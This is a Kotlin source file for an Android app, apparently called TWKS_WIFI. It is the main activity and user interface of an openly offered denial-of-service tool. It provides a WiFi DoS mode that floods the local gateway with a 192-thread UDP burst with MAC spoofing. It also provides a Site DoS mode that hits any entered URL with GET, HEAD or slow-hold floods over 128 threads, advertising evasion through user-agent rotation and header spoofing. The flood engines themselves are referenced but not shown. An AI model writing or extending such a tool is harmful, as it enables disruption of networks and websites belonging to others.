package com.twks.wifi

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*

class MainActivity : ComponentActivity() {
    private val locationPermissionRequest = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted -> if (!isGranted) finish() }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            if (cm != null) {
                val request = NetworkRequest.Builder()
                    .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
                    .build()
                cm.requestNetwork(request, object : ConnectivityManager.NetworkCallback() {
                    override fun onAvailable(network: Network) {
                        try { cm.bindProcessToNetwork(network) } catch (e: Exception) {}
                    }
                })
            }
        } catch (e: Exception) {}

        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                locationPermissionRequest.launch(Manifest.permission.ACCESS_FINE_LOCATION)
            }
        } catch (e: Exception) {}

        setContent {
            MaterialTheme(colors = darkColors(background = Color.Black, primary = Color(0xFF00FF41), onBackground = Color(0xFF00FF41))) {
                TerminalApp(this)
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        FloodEngine.stopFlood()
        SiteFloodEngine.stopFlood()
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            cm?.bindProcessToNetwork(null)
        } catch (e: Exception) {}
    }
}

val Green = Color(0xFF00FF41)
val DimGreen = Color(0xFF008F24)
val Red = Color(0xFFFF003C)
val Gold = Color(0xFFFFD700)

@Composable
fun TopBar(title: String, onBack: (() -> Unit)? = null) {
    Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth()) {
        if (onBack != null) {
            Text(
                "←",
                color = Green,
                fontSize = 26.sp,
                fontFamily = FontFamily.Monospace,
                fontWeight = FontWeight.Bold,
                modifier = Modifier.clickable { onBack() }.padding(end = 12.dp)
            )
        }
        Text(title, color = Green, fontSize = 16.sp, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
    }
    Spacer(modifier = Modifier.height(8.dp))
    Divider(color = DimGreen, thickness = 1.dp)
    Spacer(modifier = Modifier.height(16.dp))
}

@Composable
fun TerminalApp(context: ComponentActivity) {
    var screen by remember { mutableStateOf("MAIN_MENU") }
    val ctx = LocalContext.current

    Surface(color = Color.Black, modifier = Modifier.fillMaxSize()) {
        Column(modifier = Modifier.padding(16.dp).statusBarsPadding()) {
            when (screen) {
                "MAIN_MENU" -> MainMenuScreen(
                    onWiFiDoS = { screen = "WIFI_MENU" },
                    onSiteDoS = { screen = "SITE_ATTACK" }
                )
                "WIFI_MENU" -> WiFiMenuScreen(
                    onSelectTarget = { screen = "WIFI_TARGETS" },
                    onLaunchAttack = {
                        if (!NetworkEngine.isConnectedToWifi(ctx)) {
                            Toast.makeText(ctx, "Подключитесь к Wi-Fi", Toast.LENGTH_SHORT).show()
                        } else {
                            screen = "WIFI_ATTACK"
                        }
                    },
                    onBack = { screen = "MAIN_MENU" }
                )
                "WIFI_TARGETS" -> WiFiTargetListScreen(ctx,
                    onSelected = { screen = "WIFI_MENU" },
                    onBack = { screen = "WIFI_MENU" }
                )
                "WIFI_ATTACK" -> WiFiAttackScreen(onBack = { screen = "WIFI_MENU" })
                "SITE_ATTACK" -> SiteAttackScreen(onBack = { screen = "MAIN_MENU" })
            }
        }
    }
}

@Composable
fun MainMenuScreen(onWiFiDoS: () -> Unit, onSiteDoS: () -> Unit) {
    Column {
        Text("TWKS_WIFI // MAIN MENU", color = Green, fontSize = 16.sp, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
        Spacer(modifier = Modifier.height(8.dp))
        Divider(color = DimGreen, thickness = 1.dp)
        Spacer(modifier = Modifier.height(32.dp))

        Button(onClick = onWiFiDoS, colors = ButtonDefaults.buttonColors(backgroundColor = Color.Transparent), modifier = Modifier.fillMaxWidth().padding(vertical = 8.dp)) {
            Text("[ 01 ] WiFi DoS", color = Green, fontSize = 20.sp, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
        }
        Button(onClick = onSiteDoS, colors = ButtonDefaults.buttonColors(backgroundColor = Color.Transparent), modifier = Modifier.fillMaxWidth().padding(vertical = 8.dp)) {
            Text("[ 02 ] Site DoS", color = Green, fontSize = 20.sp, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
        }
        Spacer(modifier = Modifier.weight(1f))
        Text("v4.2.0 // wifi: 192 thr burst // site: 128 thr x3 vectors", color = DimGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
    }
}

@Composable
fun WiFiMenuScreen(onSelectTarget: () -> Unit, onLaunchAttack: () -> Unit, onBack: () -> Unit) {
    Column {
        TopBar("WiFi DoS") { onBack() }
        Text("[AUTO-SPOOF] MAC rotate + random ports + payload mutate", color = Gold, fontSize = 11.sp, fontFamily = FontFamily.Monospace)
        Spacer(modifier = Modifier.height(16.dp))

        Button(onClick = onSelectTarget, colors = ButtonDefaults.buttonColors(backgroundColor = Color.Transparent), modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp)) {
            Text("[ 01 ] SELECT TARGET", color = Green, fontSize = 18.sp, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
        }
        Button(onClick = onLaunchAttack, colors = ButtonDefaults.buttonColors(backgroundColor = Color.Transparent), modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp)) {
            Text("[ 02 ] LAUNCH ATTACK", color = Green, fontSize = 18.sp, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
        }
    }
}

@Composable
fun WiFiTargetListScreen(context: Context, onSelected: () -> Unit, onBack: () -> Unit) {
    var networks by remember { mutableStateOf<List<WifiNetwork>>(emptyList()) }

    LaunchedEffect(Unit) {
        networks = NetworkEngine.scanNetworks(context)
    }

    Column {
        TopBar("SELECT TARGET") { onBack() }
        Text("SCANNING...", color = Green, fontFamily = FontFamily.Monospace)
        Spacer(modifier = Modifier.height(16.dp))

        if (networks.isEmpty()) {
            Text("[-] No networks found.", color = Red, fontFamily = FontFamily.Monospace)
        }

        LazyColumn(modifier = Modifier.weight(1f)) {
            items(networks) { net ->
                Button(onClick = onSelected, colors = ButtonDefaults.buttonColors(backgroundColor = Color.Transparent), modifier = Modifier.fillMaxWidth()) {
                    Text(">> ${net.ssid} [${net.bssid}]", color = if (net.isConnected) Green else DimGreen, fontFamily = FontFamily.Monospace)
                }
            }
        }
    }
}

@Composable
fun WiFiAttackScreen(onBack: () -> Unit) {
    val ctx = LocalContext.current
    var isAttacking by remember { mutableStateOf(false) }
    var packetCount by remember { mutableStateOf(0L) }
    var pps by remember { mutableStateOf(0L) }
    val scope = rememberCoroutineScope()
    val gatewayIp = NetworkEngine.getGatewayIp(ctx) ?: "192.168.1.1"

    LaunchedEffect(isAttacking) {
        if (isAttacking) {
            var lastCount = FloodEngine.getPacketCount()
            var lastTime = System.currentTimeMillis()
            while (isAttacking && currentCoroutineContext().isActive) {
                delay(500)
                val currentCount = FloodEngine.getPacketCount()
                val currentTime = System.currentTimeMillis()
                val timeDiff = (currentTime - lastTime) / 1000.0
                pps = if (timeDiff > 0) ((currentCount - lastCount) / timeDiff).toLong() else 0L
                lastCount = currentCount
                lastTime = currentTime
                packetCount = currentCount
            }
        } else {
            pps = 0
        }
    }

    Column {
        TopBar("WiFi ATTACK") {
            isAttacking = false
            FloodEngine.stopFlood()
            onBack()
        }

        Text("TARGET: $gatewayIp", color = Green, fontFamily = FontFamily.Monospace)
        Text("VECTOR: UDP burst x3 // 192 threads", color = DimGreen, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
        Spacer(modifier = Modifier.height(16.dp))
        Text("TOTAL PACKETS: $packetCount", color = DimGreen, fontSize = 16.sp, fontFamily = FontFamily.Monospace)
        Text("THROUGHPUT: $pps PPS", color = if (isAttacking) Red else DimGreen, fontSize = 32.sp, fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace)
        Spacer(modifier = Modifier.weight(1f))

        if (isAttacking) {
            Button(onClick = {
                isAttacking = false
                FloodEngine.stopFlood()
            }, colors = ButtonDefaults.buttonColors(backgroundColor = Red), modifier = Modifier.fillMaxWidth()) {
                Text("[ ABORT ATTACK ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
            }
        } else {
            Button(onClick = {
                isAttacking = true
                scope.launch(Dispatchers.IO) {
                    FloodEngine.startFlood(gatewayIp, 192)
                }
            }, colors = ButtonDefaults.buttonColors(backgroundColor = Green), modifier = Modifier.fillMaxWidth()) {
                Text("[ EXECUTE FLOOD ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
            }
        }
    }
}

@Composable
fun SiteAttackScreen(onBack: () -> Unit) {
    var targetUrl by remember { mutableStateOf("") }
    var isAttacking by remember { mutableStateOf(false) }
    var requestCount by remember { mutableStateOf(0L) }
    var rps by remember { mutableStateOf(0L) }
    var mode by remember { mutableStateOf(0) }
    val scope = rememberCoroutineScope()

    LaunchedEffect(isAttacking) {
        if (isAttacking) {
            var lastCount = SiteFloodEngine.getRequestCount()
            var lastTime = System.currentTimeMillis()
            while (isAttacking && currentCoroutineContext().isActive) {
                delay(500)
                val currentCount = SiteFloodEngine.getRequestCount()
                val currentTime = System.currentTimeMillis()
                val timeDiff = (currentTime - lastTime) / 1000.0
                rps = if (timeDiff > 0) ((currentCount - lastCount) / timeDiff).toLong() else 0L
                lastCount = currentCount
                lastTime = currentTime
                requestCount = currentCount
            }
        } else {
            rps = 0
        }
    }

    Column {
        TopBar("Site ATTACK") {
            isAttacking = false
            SiteFloodEngine.stopFlood()
            onBack()
        }

        if (!isAttacking) {
            OutlinedTextField(
                value = targetUrl,
                onValueChange = { targetUrl = it },
                label = { Text("Enter URL (e.g., google.com)", color = DimGreen, fontFamily = FontFamily.Monospace) },
                colors = TextFieldDefaults.outlinedTextFieldColors(
                    textColor = Green,
                    focusedBorderColor = Green,
                    unfocusedBorderColor = DimGreen,
                    cursorColor = Green
                ),
                modifier = Modifier.fillMaxWidth(),
                singleLine = true
            )
            Spacer(modifier = Modifier.height(12.dp))

            Text("VECTOR:", color = DimGreen, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
            Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                VectorChip("GET FLOOD", mode == 0) { mode = 0 }
                VectorChip("HEAD FLOOD", mode == 1) { mode = 1 }
                VectorChip("SLOW HOLD", mode == 2) { mode = 2 }
            }
            Spacer(modifier = Modifier.height(12.dp))
        } else {
            Text("TARGET: $targetUrl", color = Green, fontFamily = FontFamily.Monospace)
            Text("VECTOR: ${listOf("GET FLOOD", "HEAD FLOOD", "SLOW HOLD")[mode]} // 128 threads", color = DimGreen, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
            Spacer(modifier = Modifier.height(12.dp))
        }

        Text("BYPASS: UA rotate · header spoof · cache-bust · jitter", color = Gold, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
        Spacer(modifier = Modifier.height(12.dp))
        Text("TOTAL REQUESTS: $requestCount", color = DimGreen, fontSize = 16.sp, fontFamily = FontFamily.Monospace)
        Text("THROUGHPUT: $rps RPS", color = if (isAttacking) Red else DimGreen, fontSize = 32.sp, fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace)
        Spacer(modifier = Modifier.weight(1f))

        if (isAttacking) {
            Button(onClick = {
                isAttacking = false
                SiteFloodEngine.stopFlood()
            }, colors = ButtonDefaults.buttonColors(backgroundColor = Red), modifier = Modifier.fillMaxWidth()) {
                Text("[ ABORT ATTACK ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
            }
        } else {
            Button(
                onClick = {
                    if (targetUrl.isNotEmpty()) {
                        isAttacking = true
                        scope.launch(Dispatchers.IO) {
                            SiteFloodEngine.startFlood(targetUrl, 128, mode)
                        }
                    }
                },
                enabled = targetUrl.isNotEmpty(),
                colors = ButtonDefaults.buttonColors(backgroundColor = if (targetUrl.isNotEmpty()) Green else DimGreen),
                modifier = Modifier.fillMaxWidth()
            ) {
                Text("[ EXECUTE FLOOD ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
            }
        }
    }
}

@Composable
fun VectorChip(label: String, selected: Boolean, onClick: () -> Unit) {
    Box(
        modifier = Modifier
            .clickable { onClick() }
            .padding(horizontal = 10.dp, vertical = 6.dp)
    ) {
        Text(
            "[ $label ]",
            color = if (selected) Gold else DimGreen,
            fontSize = 12.sp,
            fontFamily = FontFamily.Monospace,
            fontWeight = if (selected) FontWeight.Bold else FontWeight.Normal
        )
    }
}
